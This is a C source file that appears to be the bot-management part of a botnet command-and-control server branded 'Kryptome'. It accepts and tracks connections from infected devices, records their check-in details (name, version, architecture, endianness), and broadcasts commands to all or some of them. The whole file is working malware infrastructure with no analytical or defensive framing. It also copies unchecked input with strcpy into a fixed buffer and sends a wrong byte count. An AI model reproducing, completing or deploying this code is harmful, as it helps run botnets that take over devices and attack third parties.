#include <stdio.h>
#include <stdlib.h>
#include <sys/epoll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>

#include "includes.h"
#include "bots.h"
#include "util.h"

static struct clientdata_t clients[MAXFDS];

struct clientdata_t *bots_get_clients()
{
	return clients;
}

void broadcast(char *msg, int max)
{
	int i, max_count = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		send(i, msg, strlen(msg), MSG_NOSIGNAL);
		send(i, "\n", 1, MSG_NOSIGNAL);
        max_count += 1;
        if(max != -1 && max <= max_count) break;
 	}
}


void *BotEventLoop(void *useless)
{
	struct bots_worker_args *args = (struct bots_worker_args *)useless;
	struct epoll_event event;
	struct epoll_event * events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(args->epollfd, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events &EPOLLERR) || (events[i].events &EPOLLHUP) || (!(events[i].events &EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (args->listenfd == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(args->listenfd, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *) &in_addr)->sin_addr.s_addr;
					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;
						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							add_dup();
							break;
						}
					}

					if (dup)
					{
						if (send(infd, "\n", 13, MSG_NOSIGNAL) == -1)
						{
							close(infd);
							continue;
						}

						close(infd);
						continue;
					}

					s = make_socket_non_blocking(infd);
					if (s == -1)
					{
						close(infd);
						break;
					}

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(args->epollfd, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;
				}

				continue;
			}
			else
			{
				int datafd = events[i].data.fd;
				struct clientdata_t *client = &(clients[datafd]);
				int done = 0;
				client->connected = 1;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);
					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0)
					{
						trim(buf);
						if (strcmp(buf, "PING") == 0)
						{
							if (send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1)
							{
								done = 1;
								break;
							}

							continue;
						}

						if(strstr(buf, ":") != NULL)
						{
							int argc = 0;
							unsigned char **argv = util_strip(buf, &argc, ':');
							if(argc > 0 && argv != NULL)
							{
								if(strcmp(argv[0], "VER") == 0 && argc == 5)
								{
									int bot_version;
									char bot_name[64];
									int bot_endianess, bot_build;

									bot_version = atoi(argv[1]);
									strcpy(bot_name, argv[2]);
									bot_endianess = atoi(argv[3]);
									bot_build = atoi(argv[4]);

									client->build = bot_build;
									client->endianess = bot_endianess;
									strcpy(client->name, bot_name);
									client->version = bot_version;

									printf("\x1b[97m[\x1b[38;5;202mKryptome\x1b[97m] \x1b[38;5;202mName: \x1b[97m%s \x1b[38;5;202mVersion: \x1b[97m%d \x1b[38;5;202mArch: \x1b[97m%s \x1b[38;5;202mEndianess: \x1b[97m%s\r\n", bot_name, bot_version, id2arch(bot_build), id2endianess(bot_endianess));
								}

								int arg_pos;
								for(arg_pos = 0; arg_pos < argc; arg_pos++)
								{
									free(argv[arg_pos]);
								}
								free(argv);
								continue;
							}
						}

						printf("buf: \"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}

						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}

					if (done)
					{
						client->connected = 0;
						close(datafd);
					}
				}
			}
		}
	}
}

unsigned int BotsConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}
